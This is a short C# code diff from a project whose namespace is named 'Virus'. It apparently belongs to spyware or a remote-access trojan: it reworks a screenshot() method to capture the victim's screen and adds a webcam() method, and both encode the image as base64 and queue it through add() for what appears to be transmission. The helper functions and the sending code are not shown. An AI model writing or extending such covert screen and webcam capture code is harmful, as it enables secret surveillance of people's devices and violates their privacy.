@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Drawing;
 
 namespace Virus {
 
@@ -29,7 +30,11 @@ namespace Virus {
         }
 
         public void screenshot() {
-            add("screenshot", Tools.EncodeToBase64(Tools.EncodeImageToASCII(Tools.ScaleImage(Tools.GetWebcamImage(), Client.SCREENSHOT_SCALE_FACTOR))));
+            add("screenshot", Tools.EncodeToBase64(Tools.EncodeImageToASCII(Tools.ScaleImage(Tools.TakeScreenshot(), Client.SCREENSHOT_SCALE_FACTOR))));
+        }
+
+        public void webcam(Bitmap image) {
+            add("webcam", Tools.EncodeToBase64(Tools.EncodeImageToASCII(image)));
         }
 
         public void Clear() {
